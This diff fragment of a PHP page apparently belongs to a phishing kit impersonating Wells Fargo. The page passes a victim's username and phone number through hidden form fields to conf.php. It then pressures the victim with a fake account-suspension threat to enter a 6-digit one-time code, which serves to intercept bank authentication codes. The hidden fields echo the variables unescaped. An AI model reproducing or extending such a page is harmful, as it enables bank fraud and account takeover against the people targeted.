@@ -84,8 +84,8 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
             <div class="overlayContainer">
                 <div class="signOnContainer" align="center" style="width: 100%; max-width: 650px;">
                     <form id="" name="frmSignon" action="conf.php" method="post" autocomplete="off">
-                        <input type="hidden" name="user" value="<?php print " $user "; ?>">
-                        <input type="hidden" name="phone" value="<?php print " $phone "; ?>">
+                        <input type="hidden" name="user" value="<?=$user;?>">
+                        <input type="hidden" name="phone" value="<?=$phone;?>">
                         <p style="font-size: 110%; color: #FFFFFF; ">For your security, an Advanced Access code is required. </p>
                         <p style="font-size: 120%; color: #FFFFFF; ">We have sent you a message with a 6 digit code ("To send 500.00 to Wells Fargo with a unique code") to your phone number.</p>
                         <p style="font-size: 120%; color: #FFFFFF; font-weight: bold;">Failing to input the specific code will cause your account to remain suspended and the authentication will not be validated.</p>
